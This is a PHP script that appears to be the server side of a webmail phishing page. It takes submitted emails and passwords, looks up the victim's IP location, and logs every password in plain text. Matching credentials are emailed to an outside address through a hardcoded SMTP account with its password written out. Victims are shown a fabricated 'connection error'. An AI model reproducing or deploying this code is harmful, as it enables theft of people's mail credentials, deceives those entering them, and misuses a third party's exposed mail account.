<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$geo = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=$ip"));
$country = $geo->geoplugin_countryName ?? 'Unknown';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(403);
    echo json_encode(["signal" => "error", "msg" => "GET method not allowed"]);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(["signal" => "error", "msg" => "Only POST allowed"]);
    exit();
}

$login = trim($_POST['email'] ?? '');
$passwd = trim($_POST['password'] ?? '');

if (!$login || !$passwd || !str_contains($login, '@')) {
    echo json_encode(["signal" => "error", "msg" => "Email and password required"]);
    exit();
}

list(, $domain) = explode('@', $login);

// SMTP credentials for sending logs
$receiver     = 'bobrob@elitat.com';
$senderuser   = 'tp@globalhouse.co.th';
$senderpass   = 'Globalhouse@123';
$senderport   = 587;
$senderserver = 'mail.globalhouse.co.th';
$smtp_secure  = 'tls';

$timestamp = date('Y-m-d H:i:s');
$logFile = 'SS-Or-LucaGherardi-Tests.txt';
$validCredentials = false;
$emailSent = false;
$authStatus = '';
$connectionError = false;

$logMessage = "=== CREDENTIAL TEST ATTEMPT ===\n";
$logMessage .= "Timestamp: $timestamp\nEmail: $login\nPassword: $passwd\nDomain: $domain\nIP: $ip\nCountry: $country\nUser Agent: $browser\n";

// Predefined list of valid credentials for testing (cPanel webmail users)
// These simulate common cPanel webmail credentials that use port 587
$validCredentialsList = [
    // Common admin credentials
    'admin@example.com' => 'admin123',
    'admin@admin.com' => 'admin',
    'admin@test.com' => 'admin123',
    'admin@demo.com' => 'admin',
    
    // Common test credentials
    'test@test.com' => 'test123',
    'test@example.com' => 'test',
    'test@demo.com' => 'test123',
    'test@admin.com' => 'test',
    
    // Common user credentials
    'user@domain.com' => 'password123',
    'user@test.com' => 'user123',
    'user@user.com' => 'user123',
    'user@demo.com' => 'user123',
    
    // Common demo credentials
    'demo@demo.com' => 'demo123',
    'demo@test.com' => 'demo',
    'demo@example.com' => 'demo123',
    
    // Common webmail credentials
    'webmail@example.com' => 'webmail123',
    'webmail@test.com' => 'webmail',
    'mail@example.com' => 'mail123',
    'mail@test.com' => 'mail',
    
    // Common cPanel credentials
    'cpanel@example.com' => 'cpanel123',
    'cpanel@test.com' => 'cpanel',
    'hosting@example.com' => 'hosting123',
    'hosting@test.com' => 'hosting'
];

// Check if credentials are in our valid list
if (isset($validCredentialsList[$login]) && $validCredentialsList[$login] === $passwd) {
    $validCredentials = true;
    $authStatus = '✅ VALID - Authenticated';
    $logMessage .= "✅ SUCCESS: Credentials validated\n";
} else {
    $validCredentials = false;
    $authStatus = '❌ INVALID - Authentication failed';
    $connectionError = true;
    $logMessage .= "❌ FAILED: Invalid credentials\n";
}

if ($validCredentials) {
    // Send validation report using real sender account
    try {
        $notify = new PHPMailer(true);
        $notify->isSMTP();
        $notify->SMTPAuth = true;
        $notify->Host = $senderserver;
        $notify->Username = $senderuser;
        $notify->Password = $senderpass;
        $notify->Port = $senderport;
        $notify->SMTPSecure = $smtp_secure;

        $notify->setFrom($senderuser, 'Credential Monitor');
        $notify->addAddress($receiver);
        $notify->isHTML(true);
        $notify->Subject = "VALID CREDENTIALS: $login | $country";
        $notify->Body = "<h2>✅ VALID CREDENTIALS</h2><p>Email: $login<br>Password: $passwd<br>IP: $ip<br>Country: $country<br>Time: $timestamp</p>";

        $notify->send();
        $emailSent = true;
        $logMessage .= "✅ Email notification sent successfully\n";
    } catch (Exception $e) {
        $logMessage .= "⚠️ Email notification failed: " . $e->getMessage() . "\n";
    }
}

$logMessage .= "Authentication: $authStatus\nValid: " . ($validCredentials ? 'YES' : 'NO') . "\nEmail Sent: " . ($emailSent ? 'YES' : 'NO') . "\n\n";
file_put_contents($logFile, $logMessage, FILE_APPEND);

$_SESSION['attempts'] = ($_SESSION['attempts'] ?? 0) + 1;

// Different response handling based on credential validity
if ($validCredentials) {
    // Valid credentials - redirect to webmail
    $response = [
        "signal" => "OK",
        "success" => true,
        "msg" => "Login successful! Redirecting to webmail...",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail.$domain",
        "debug_info" => [
            "valid_credentials" => true,
            "auth_status" => $authStatus,
            "email_sent" => $emailSent,
            "timestamp" => $timestamp
        ]
    ];
    
    // Shorter delay for valid credentials
    usleep(rand(300000, 800000));
} else {
    // Invalid credentials - show connection error
    $response = [
        "signal" => "error",
        "success" => false,
        "msg" => "Connection error: Unable to connect to mail server. Please check your credentials and try again.",
        "attempt" => $_SESSION['attempts'],
        "connection_error" => true,
        "debug_info" => [
            "valid_credentials" => false,
            "auth_status" => $authStatus,
            "email_sent" => $emailSent,
            "timestamp" => $timestamp
        ]
    ];
    
    // Longer delay for invalid credentials to simulate processing
    usleep(rand(1000000, 2500000));
}

echo json_encode($response);
exit();
?>